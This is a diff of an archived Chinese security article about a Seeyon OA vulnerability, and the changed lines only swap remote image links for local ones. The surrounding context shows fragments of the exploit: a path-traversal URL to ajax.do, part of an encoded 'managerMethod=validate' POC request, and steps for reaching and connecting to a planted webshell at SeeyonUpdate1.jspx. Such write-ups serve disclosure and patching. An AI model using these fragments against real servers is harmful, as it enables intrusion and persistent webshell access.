@@ -75,7 +75,7 @@ schema_version: "1"
 
 https://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbwAJPmZZKyFswA6siaVynTDb4H3eceEKSjHVxtJIg509vUgAlBzia0FRR17nJE77hHp16lgpO4g1bw/640?wx_fmt=png)
+![](../../.resource/remote/0a247c076b65c5d7df9ec1a270a14e67b8ebec5821b6db3a1169c5d5061523c2.png)
 
 ##### 2. 漏洞 poc
 
@@ -104,23 +104,23 @@ managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A
 
 (1): 执行 POC
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbwAJPmZZKyFswA6siaVynTDGM8nyPbrldON9p5fFyw5A4Zuxv6yy6lJ74In7gfqStsS6FX0MbSwVg/640?wx_fmt=png)
+![](../../.resource/remote/2b56e8b960abb81d5b073f197562fb79e3f20c8620d02e3182f4cc5900c14217.png)
 
 (2): 访问 webshell 页面
 
 https://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbwAJPmZZKyFswA6siaVynTDq7TzAGx4ZLYJmicJl1Mia4nHePx0Osic0jUaPHXibmndCg9UoF96kfp52A/640?wx_fmt=png)
+![](../../.resource/remote/a4276725b1ec0afd6c08da56712035da6ceaa3e2b0d35e4b720b447d7c65878b.png)
 
 (3): 成功连接 webshell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbwAJPmZZKyFswA6siaVynTD6PdKLN4QevYLEEchZkBx6tfF66Wm3NU18gUwoP9SRwr2jQBYusZoBQ/640?wx_fmt=png)
+![](../../.resource/remote/e57fb3d5ab5010eafc6ab7b8d1febb2380c1199d2931fa22c8050c1a2713dd8a.png)
 
 ##### 4. 漏洞利用失败
 
 如果显示如下格式，则表示漏洞利用失败。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbwAJPmZZKyFswA6siaVynTDIJsBkurF99jgNYmzJia7RL5DDCdic86sNHciaQfTal63RtVzg0Mn5Q8tg/640?wx_fmt=png)
+![](../../.resource/remote/b58da61bf7028b13f90713a226a85bb0e30f7b16c62f16dbf24654ee53fb86da.png)
 
 #### 四、漏洞修复
 
@@ -128,9 +128,9 @@ https://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx
 
 -END-
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61miagSh8mlA1Yb2riaSibiaTE9wF0zoZfPOTIgSMKrvTjM6lSBWwSiaGx584g/640?wx_fmt=gif)
+![](../../.resource/remote/80553c90ac8f3dad9d51c65f90a5ebc4770f8a28ac4e535270f131dff17805f5.gif)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mrMsqiaz5Is1EjiayDv4AFiaFibBAdZjwTuhlVF0NaOM1A9DXx0qy48se8Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/10df53ddb5dc8004ce11136a15d019ede6f85fde6709b9c2a7e54693d44aa2c3.jpg)
 
 微信号：Zero-safety
 
@@ -138,7 +138,7 @@ https://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx
 
 带你领略不一样的世界
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mOnuN32N92RN4WvG94sL3diaBGSaFNMh2ZQXtibB0SiaLtyCuk6e6EKYoQ/640?wx_fmt=gif)
+![](../../.resource/remote/47ef48399bf1f767f1864c0e3a1978f861ec87e6c93d0643019de397089f8a73.gif)
 
 ---
 
